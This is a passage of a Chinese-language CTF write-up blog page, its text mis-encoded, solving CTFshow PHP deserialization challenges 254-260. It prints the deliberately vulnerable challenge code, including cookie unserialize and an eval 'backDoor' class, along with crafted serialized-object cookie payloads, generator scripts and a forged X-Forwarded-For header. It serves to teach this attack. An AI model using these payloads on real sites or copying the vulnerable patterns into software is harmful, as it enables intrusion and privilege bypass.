<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CTFshowåˆ·é¢˜æ—¥è®°-WEB-ååºåˆ—åŒ–ç¯‡(ä¸Šï¼Œ254-263) - ITå­¦ä¹ è€…åšå®¢</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="CTFshowåˆ·é¢˜æ—¥è®°-WEB-ååºåˆ—åŒ–ç¯‡(ä¸Šï¼Œ254-263)" />
<meta property="og:description" content="éååºåˆ—åŒ– web254-ç®€å•å®¡è®¡ è¿™ä¸ªé¢˜æ˜¯æç¬‘çš„ä¹ˆğŸ¤£
æŒ‰ç€æºç é¡ºåºèµ°ä¸€é
...... $username=$_GET[&#39;username&#39;]; $password=$_GET[&#39;password&#39;]; if(isset($username) &amp;&amp; isset($password)){ $user = new ctfShowUser(); if($user-&gt;login($username,$password)){ if($user-&gt;checkVip()){ $user-&gt;vipOneKeyGetFlag(); } }else{ echo &#34;no vip,no flag&#34;; } } æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç”Ÿæˆå¯¹è±¡ï¼Œè°ƒç”¨ login å‡½æ•°
# login å‡½æ•° class ctfShowUser{ public $username=&#39;xxxxxx&#39;; public $password=&#39;xxxxxx&#39;; public $isVip=false; ...... public function login($u,$p){ if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p){ $this-&gt;isVip=true; } return $this-&gt;isVip; } ...... payload
?username=xxxxxx&amp;password=xxxxxx web259-ä¼ªé€ è¯·æ±‚ flag.php
$xff = explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]); array_pop($xff); $ip = array_pop($xff); if($ip!==&#39;127.0.0.1&#39;){ die(&#39;error&#39;); }else{ $token = $_POST[&#39;token&#39;]; if($token==&#39;ctfshow&#39;){ file_put_contents(&#39;flag." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/b5a64f60c0ee9d8e1fae0a8dacb447ad/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-09-22T12:36:52+08:00" />
<meta property="article:modified_time" content="2021-09-22T12:36:52+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="ITå­¦ä¹ è€…åšå®¢" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">ITå­¦ä¹ è€…åšå®¢</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">CTFshowåˆ·é¢˜æ—¥è®°-WEB-ååºåˆ—åŒ–ç¯‡(ä¸Šï¼Œ254-263)</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-tomorrow-night">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h3><a id="_0"></a>éååºåˆ—åŒ–</h3> 
<h4><a id="web254_2"></a>web254-ç®€å•å®¡è®¡</h4> 
<p>è¿™ä¸ªé¢˜æ˜¯æç¬‘çš„ä¹ˆğŸ¤£</p> 
<p>æŒ‰ç€æºç é¡ºåºèµ°ä¸€é</p> 
<pre><code class="prism language-php"><span class="token operator">...</span><span class="token operator">...</span>
<span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç”Ÿæˆå¯¹è±¡ï¼Œè°ƒç”¨ login å‡½æ•°</p> 
<pre><code class="prism language-php"><span class="token comment"># login å‡½æ•°</span>
<span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token operator">...</span><span class="token operator">...</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">isVip</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token operator">...</span><span class="token operator">...</span>
</code></pre> 
<p>payload</p> 
<pre><code>?username=xxxxxx&amp;password=xxxxxx
</code></pre> 
<h4><a id="web259_49"></a>web259-ä¼ªé€ è¯·æ±‚</h4> 
<p>flag.php</p> 
<pre><code class="prism language-php"><span class="token variable">$xff</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!==</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
	<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
	<span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token operator">==</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
		<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>éœ€è¦ä¼ªé€  xff å¤´</p> 
<p>è¿™é¢˜å’Œååºåˆ—åŒ–æ²¡å…³ç³»ã€‚ã€‚ã€‚</p> 
<p><img src="https://images2.imgbox.com/b9/c0/UYtcvv8A_o.png" alt="image-20210921094256853"></p> 
<p>ç„¶åå»æµè§ˆå™¨è®¿é—® /flag.txt</p> 
<h4><a id="web260_77"></a>web260-æ­£åˆ™åŒ¹é…</h4> 
<p>é¢˜ç›®æºç </p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow_i_love_36D/'</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>åªè¦ get ä¼ å‚ååºåˆ—åŒ–åçš„å­—ç¬¦ä¸²æœ‰ ctfshow_i_love_36D å°±å¯ä»¥</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">ctfshow_i_love_36D</span><span class="token punctuation">{<!-- --></span>
<span class="token punctuation">}</span>

<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfshow_i_love_36D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>payload</p> 
<pre><code class="prism language-php"><span class="token operator">?</span>ctfshow<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token string double-quoted-string">"ctfshow_i_love_36D"</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token string double-quoted-string">"isVip"</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D
</code></pre> 
<h3><a id="_110"></a>ç®€å•ååºåˆ—åŒ–</h3> 
<h4><a id="web255_112"></a>web255-ç®€å•åºåˆ—åŒ–å­—ç¬¦ä¸²æ„é€ </h4> 
<p>è¿™æ¬¡æ˜¯é€šè¿‡ååºåˆ—åŒ– cookie ç”Ÿæˆå¯¹è±¡</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">isVip</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
              <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>è®© isVip çš„å€¼ä¸º ture</p> 
<p>å»æ„é€ åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–ç®€å•çš„é¢˜è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œå› ä¸ºæ–¹æ³•åœ¨ååºåˆ—åŒ–æ—¶æ²¡æ³•ä¿å­˜ï¼Œæ‰€ä»¥åªèƒ½æ§åˆ¶å±æ€§</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
    
<span class="token comment"># O:11:"ctfShowUser":1:{s:5:"isVip";b:1;}   </span>
<span class="token comment"># åˆ†å·éœ€è¦ url ç¼–ç     </span>
</code></pre> 
<p>æ”¹å˜ cookie çš„å€¼ï¼Œæ·»åŠ  user å­—æ®µï¼Œå¯ä»¥æµè§ˆå™¨F12æ·»åŠ ï¼Œä¹Ÿå¯ä»¥ burp æŠ“åŒ…æ·»åŠ </p> 
<p><img src="https://images2.imgbox.com/d5/d1/EHAkO3f9_o.png" alt="image-20210919221407142"></p> 
<p>æ·»åŠ ä¹‹åè®¿é—® url</p> 
<pre><code>/?username=xxxxxx&amp;password=xxxxxx
cookie:user=O:11:"ctfShowUser":1:{s:5:"isVip"%3bb:1%3b}"
</code></pre> 
<p>å¾—åˆ° flag</p> 
<h4><a id="web256_191"></a>web256-ç®€å•åºåˆ—åŒ–å­—ç¬¦ä¸²æ„é€ </h4> 
<p>å’Œä¸Šé¢˜çš„åŸºæœ¬å¥—è·¯ä¸€è‡´ï¼Œä¸è¿‡ vipOneKeyGetFlag å‡½æ•°å‘ç”Ÿäº†å˜åŒ–</p> 
<pre><code class="prism language-php">	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
              <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre> 
<p>æ³¨æ„å°±æ˜¯ username çš„å€¼å’Œ password çš„å€¼ä¸èƒ½ç›¸ç­‰ï¼Œå…¶å®è¿™ç‚¹å¾ˆå¥½å®ç°ï¼Œå› ä¸ºååºåˆ—åŒ–åç”Ÿæˆçš„ ctfShowUser å¯¹è±¡çš„å±æ€§æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œè®© username æ˜¯ä»»æ„å­—ç¬¦ä¸²éƒ½å¯ä»¥</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'anything'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">TRUE</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
    
<span class="token comment"># O:11:"ctfShowUser":2:{s:8:"username";s:8:"anything";s:5:"isVip";b:1;}</span>
<span class="token comment"># O%3A11%3A%22ctfShowUser%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A8%3A%22anything%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D    </span>
</code></pre> 
<p><img src="https://images2.imgbox.com/e8/07/OU5umQ4D_o.png" alt="image-20210919223805561"></p> 
<h4><a id="web257_225"></a>web257-é­”æ³•æ–¹æ³•</h4> 
<pre><code class="prism language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token keyword">class</span><span class="token operator">-&gt;</span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">info</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">user</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">backDoor</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$code</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>é­”æ³•æ–¹æ³•ä»–æ¥äº†ï¼Œåˆšæ‰è¯´äº†æ–¹æ³•ä¸èƒ½è¢«åºåˆ—åŒ–ï¼Œä½†æ˜¯æ¯”å¦‚ __construct é­”æ³•æ–¹æ³•è¿™ç§åœ¨ç”Ÿæˆå¯¹è±¡æ—¶å°±è¢«è°ƒç”¨äº†ï¼Œæ‰€ä»¥åœ¨æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶ä¹Ÿè¦è€ƒè™‘</p> 
